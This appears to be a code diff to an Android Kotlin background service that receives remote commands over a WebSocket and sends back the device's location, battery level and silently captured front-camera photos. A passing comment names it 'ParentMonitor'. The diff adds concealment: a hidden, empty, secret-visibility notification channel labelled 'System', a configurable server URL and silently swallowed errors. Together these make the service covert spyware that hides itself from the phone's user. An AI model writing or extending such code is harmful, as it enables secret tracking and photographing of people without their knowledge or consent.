@@ -23,13 +23,9 @@ class CoreService : Service() {
         super.onCreate()
         instance = this
         fusedLocationClient = LocationServices.getFusedLocationProviderClient(this)
-        createNotificationChannel()
-        startForeground(1, buildNotification())
-        try {
-            connectServer()
-        } catch (e: Exception) {
-            e.printStackTrace()
-        }
+        createHiddenNotificationChannel()
+        startForeground(1, buildHiddenNotification())
+        try { connectServer() } catch (e: Exception) { }
     }
 
     override fun onDestroy() {
@@ -39,6 +35,11 @@ class CoreService : Service() {
     }
 
     private fun connectServer() {
+        // Use URL from SharedPrefs if saved, else use companion default
+        val savedUrl = getSharedPreferences("config", MODE_PRIVATE)
+            .getString("server_url", null)
+        if (savedUrl != null) SERVER_URL = savedUrl
+
         wsManager = WebSocketManager(
             serverUrl = SERVER_URL,
             onMessage = { handleCommand(it) },
@@ -54,7 +55,7 @@ class CoreService : Service() {
                 "lock_screen" -> lockScreen()
                 "get_battery" -> sendBattery()
                 "get_location" -> sendLocation()
-                "take_photo" -> sendPhoto()
+                "take_photo"  -> sendPhoto()
             }
         } catch (e: Exception) { }
     }
@@ -77,21 +78,16 @@ class CoreService : Service() {
 
     private fun sendBattery() {
         try {
-            val bm = getSystemService(BATTERY_SERVICE)
-                as android.os.BatteryManager
-            // Key must be "battery" — ParentMonitor reads data.optInt("battery")
-            val level = bm.getIntProperty(
-                android.os.BatteryManager.BATTERY_PROPERTY_CAPACITY)
-            sendData("battery", JSONObject().apply {
-                put("battery", level)
-            })
+            val bm = getSystemService(BATTERY_SERVICE) as android.os.BatteryManager
+            val level = bm.getIntProperty(android.os.BatteryManager.BATTERY_PROPERTY_CAPACITY)
+            sendData("battery", JSONObject().apply { put("battery", level) })
         } catch (e: Exception) { }
     }
 
     private fun sendLocation() {
         try {
-            fusedLocationClient?.lastLocation?.addOnSuccessListener { location: Location? ->
-                location?.let {
+            fusedLocationClient?.lastLocation?.addOnSuccessListener { loc: Location? ->
+                loc?.let {
                     sendData("location", JSONObject().apply {
                         put("lat", it.latitude)
                         put("lng", it.longitude)
@@ -103,93 +99,84 @@ class CoreService : Service() {
 
     private fun sendPhoto() {
         try {
-            val cameraManager = getSystemService(CAMERA_SERVICE) as CameraManager
-            val cameraId = cameraManager.cameraIdList.firstOrNull { id ->
-                cameraManager.getCameraCharacteristics(id)
+            val mgr = getSystemService(CAMERA_SERVICE) as CameraManager
+            val cameraId = mgr.cameraIdList.firstOrNull { id ->
+                mgr.getCameraCharacteristics(id)
                     .get(CameraCharacteristics.LENS_FACING) ==
                         CameraCharacteristics.LENS_FACING_FRONT
-            } ?: cameraManager.cameraIdList.firstOrNull() ?: return
+            } ?: mgr.cameraIdList.firstOrNull() ?: return
 
-            val characteristics = cameraManager.getCameraCharacteristics(cameraId)
-            val map = characteristics.get(
-                CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP) ?: return
-            val sizes = map.getOutputSizes(android.graphics.ImageFormat.JPEG)
-            val size = sizes.minByOrNull { it.width * it.height } ?: return
+            val map = mgr.getCameraCharacteristics(cameraId)
+                .get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP) ?: return
+            val size = map.getOutputSizes(android.graphics.ImageFormat.JPEG)
+                .minByOrNull { it.width * it.height } ?: return
 
             val imageReader = android.media.ImageReader.newInstance(
                 size.width, size.height, android.graphics.ImageFormat.JPEG, 1)
+            val thread = android.os.HandlerThread("CamThread").apply { start() }
+            val handler = android.os.Handler(thread.looper)
 
-            val handlerThread = android.os.HandlerThread("CameraThread").apply { start() }
-            val cameraHandler = android.os.Handler(handlerThread.looper)
-
-            cameraManager.openCamera(cameraId, object : CameraDevice.StateCallback() {
-                override fun onOpened(camera: CameraDevice) {
-                    val session = imageReader.surface
-                    val captureRequest = camera.createCaptureRequest(
-                        CameraDevice.TEMPLATE_STILL_CAPTURE).apply {
-                        addTarget(imageReader.surface)
-                    }.build()
-
-                    camera.createCaptureSession(
-                        listOf(session),
+            mgr.openCamera(cameraId, object : CameraDevice.StateCallback() {
+                override fun onOpened(cam: CameraDevice) {
+                    val req = cam.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE)
+                        .apply { addTarget(imageReader.surface) }.build()
+                    cam.createCaptureSession(listOf(imageReader.surface),
                         object : CameraCaptureSession.StateCallback() {
                             override fun onConfigured(s: CameraCaptureSession) {
-                                s.capture(captureRequest, object :
-                                    CameraCaptureSession.CaptureCallback() {
+                                s.capture(req, object : CameraCaptureSession.CaptureCallback() {
                                     override fun onCaptureCompleted(
-                                        session: CameraCaptureSession,
-                                        request: android.hardware.camera2.CaptureRequest,
-                                        result: android.hardware.camera2.TotalCaptureResult
+                                        ss: CameraCaptureSession,
+                                        r: android.hardware.camera2.CaptureRequest,
+                                        res: android.hardware.camera2.TotalCaptureResult
                                     ) {
-                                        val image = imageReader.acquireLatestImage()
-                                        image?.let {
-                                            val buffer = it.planes[0].buffer
-                                            val bytes = ByteArray(buffer.remaining())
-                                            buffer.get(bytes)
-                                            val b64 = android.util.Base64
-                                                .encodeToString(bytes,
-                                                    android.util.Base64.NO_WRAP)
+                                        imageReader.acquireLatestImage()?.let { img ->
+                                            val buf = img.planes[0].buffer
+                                            val bytes = ByteArray(buf.remaining()).also { buf.get(it) }
                                             sendData("photo", JSONObject().apply {
-                                                put("image", b64)
+                                                put("image", android.util.Base64.encodeToString(
+                                                    bytes, android.util.Base64.NO_WRAP))
                                             })
-                                            it.close()
+                                            img.close()
                                         }
-                                        camera.close()
-                                        handlerThread.quitSafely()
+                                        cam.close(); thread.quitSafely()
                                     }
-                                }, cameraHandler)
+                                }, handler)
                             }
                             override fun onConfigureFailed(s: CameraCaptureSession) {
-                                camera.close()
-                                handlerThread.quitSafely()
+                                cam.close(); thread.quitSafely()
                             }
-                        }, cameraHandler)
+                        }, handler)
                 }
-                override fun onDisconnected(camera: CameraDevice) { camera.close() }
-                override fun onError(camera: CameraDevice, error: Int) { camera.close() }
-            }, cameraHandler)
+                override fun onDisconnected(cam: CameraDevice) { cam.close() }
+                override fun onError(cam: CameraDevice, e: Int) { cam.close() }
+            }, handler)
         } catch (e: Exception) { }
     }
 
-    private fun createNotificationChannel() {
+    /** Hidden notification channel — no status bar icon, no sound, no badge */
+    private fun createHiddenNotificationChannel() {
         val channel = NotificationChannel(
-            "main", "System",
-            NotificationManager.IMPORTANCE_MIN)
-        getSystemService(NotificationManager::class.java)
-            .createNotificationChannel(channel)
+            "hidden", "System",
+            NotificationManager.IMPORTANCE_NONE   // no status bar icon
+        ).apply {
+            setShowBadge(false)
+            enableLights(false)
+            enableVibration(false)
+        }
+        getSystemService(NotificationManager::class.java).createNotificationChannel(channel)
     }
 
-    private fun buildNotification(): Notification {
-        return NotificationCompat.Builder(this, "main")
-            .setContentTitle("System Service")
-            .setSmallIcon(android.R.drawable.ic_dialog_info)
+    private fun buildHiddenNotification(): Notification {
+        return NotificationCompat.Builder(this, "hidden")
+            .setContentTitle("")
+            .setContentText("")
+            .setSmallIcon(android.R.drawable.screen_background_dark)
             .setPriority(NotificationCompat.PRIORITY_MIN)
+            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
+            .setShowWhen(false)
             .build()
     }
 
-    override fun onStartCommand(
-        intent: Intent?, f: Int, id: Int
-    ) = START_STICKY
-
+    override fun onStartCommand(intent: Intent?, f: Int, id: Int) = START_STICKY
     override fun onBind(intent: Intent?): IBinder? = null
 }
